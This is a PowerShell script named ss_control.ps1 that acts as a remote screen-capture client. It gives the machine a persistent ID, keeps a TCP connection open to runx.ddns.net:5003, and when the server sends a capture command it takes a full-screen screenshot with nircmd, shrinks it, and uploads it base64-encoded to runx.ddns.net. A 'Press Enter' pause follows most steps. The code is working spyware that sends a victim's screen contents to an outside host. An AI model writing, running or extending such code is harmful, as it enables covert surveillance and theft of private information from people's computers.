Write-Host "=== Starting ss_control.ps1 ===" -ForegroundColor Cyan
Read-Host -Prompt "Press Enter to continue..."

if (!(Test-Path "$env:TEMP\run")) {
  $null = New-Item "$env:TEMP\run" -ItemType Directory
}

$mutex = New-Object System.Threading.Mutex($false, "ss_control")
if (-not $mutex.WaitOne(0)) {
  Write-Host "Another ss_control instance is running. Exiting." -ForegroundColor Yellow
  Read-Host -Prompt "Press Enter to exit..."
  exit
}

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()

  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
$SCRIPT_VERSION = "16026ce"
$clientVersion = $SCRIPT_VERSION
Write-Host "Client: $uniqueUser | Version: $clientVersion" -ForegroundColor Yellow
Read-Host -Prompt "Press Enter to continue..."

$UserFolder = Join-Path (Join-Path $env:TEMP "frames-repo") $uniqueUser
if (!(Test-Path $UserFolder)) {
  $null = New-Item $UserFolder -ItemType Directory
}

Add-Type -AssemblyName System.Drawing

$VPS_HOST = "runx.ddns.net"
$VPS_PORT = 5003
$VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"

function Capture-And-Upload {
  Write-Host "Capturing screenshot frame..." -ForegroundColor Yellow
  Read-Host -Prompt "Press Enter to continue..."
  $Timestamp = Get-Date -Format "yyyyMMddHHmmssfff"
  $RawPath = Join-Path $UserFolder "raw_$Timestamp.png"
  $JpegPath = Join-Path $UserFolder "$Timestamp.jpg"

  Start-Process `
    -FilePath "$env:TEMP\run\nircmd\nircmd.exe" `
    -ArgumentList @(
    "savescreenshotfull",
    $RawPath
  ) -WindowStyle Normal -Wait

  if (Test-Path $RawPath) {
    $MagickExe = "$env:TEMP\run\magick\magick.exe"
    $magickArgs = "`"$RawPath`" -colorspace gray -resize 50% -quality 80 `"$JpegPath`""

    Start-Process `
      -FilePath $MagickExe `
      -ArgumentList @(
      $magickArgs
    ) -WindowStyle Normal -Wait

    Remove-Item $RawPath -Force
  }

  if (Test-Path $JpegPath) {
    Write-Host "Uploading frame: $Timestamp.jpg" -ForegroundColor Yellow
    Read-Host -Prompt "Press Enter to continue..."
    $fileBytes = [System.IO.File]::ReadAllBytes($JpegPath)
    $base64Image = [Convert]::ToBase64String($fileBytes)
    $body = @{
      username = $uniqueUser
      filename = (Get-Item $JpegPath).Name
      image = $base64Image
    } | ConvertTo-Json -Compress

    Invoke-RestMethod `
      -Method Post `
      -Uri $VPS_UPLOAD_URL `
      -ContentType "application/json" `
      -Body $body `
      -TimeoutSec 10 `
      -UseBasicParsing |
      Out-Null

    Write-Host "Frame uploaded successfully." -ForegroundColor Green
    Read-Host -Prompt "Press Enter to continue..."
    Remove-Item $JpegPath -Force
  }
}

try {
  while ($true) {
    try {
      Write-Host "Connecting ss_control TCP socket to $VPS_HOST:$VPS_PORT..." -ForegroundColor Yellow
      Read-Host -Prompt "Press Enter to continue..."
      $tcpClient = New-Object System.Net.Sockets.TcpClient
      $tcpClient.Connect($VPS_HOST, $VPS_PORT)

      if ($tcpClient.Connected) {
        Write-Host "ss_control TCP connected." -ForegroundColor Green
        Read-Host -Prompt "Press Enter to continue..."
        $stream = $tcpClient.GetStream()
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        $hsObj = @{ username = $uniqueUser; version = $clientVersion; client_type = "frames" } | ConvertTo-Json -Compress
        $writer.WriteLine($hsObj)

        while ($tcpClient.Connected) {
          $line = $reader.ReadLine()
          if ($null -eq $line) {
            Write-Host "Server disconnected TCP socket." -ForegroundColor Red
            Read-Host -Prompt "Press Enter to continue..."
            break
          }

          if ($line -match '"type":\s*"ping"') {
            $writer.WriteLine('{"type":"pong"}')
            continue
          }

          Write-Host "Received payload: $line" -ForegroundColor Cyan
          Read-Host -Prompt "Press Enter to continue..."
          $r = $line | ConvertFrom-Json
          if ($r.capture -eq $true) {
            Capture-And-Upload
          }
        }
      }
    }
    catch {
      Write-Host "ss_control connection error: $($_.Exception.Message)" -ForegroundColor Red
      Read-Host -Prompt "Press Enter to continue..."
    }
    finally {
      if ($tcpClient) {
        $tcpClient.Close()
        $tcpClient.Dispose()
      }
    }

    Write-Host "Reconnecting in 3 seconds..." -ForegroundColor Yellow
    Read-Host -Prompt "Press Enter to continue..."
    Start-Sleep -Seconds 3
  }
}
finally {
  if ($mutex) {
    $mutex.ReleaseMutex()
    $mutex.Dispose()
  }
}
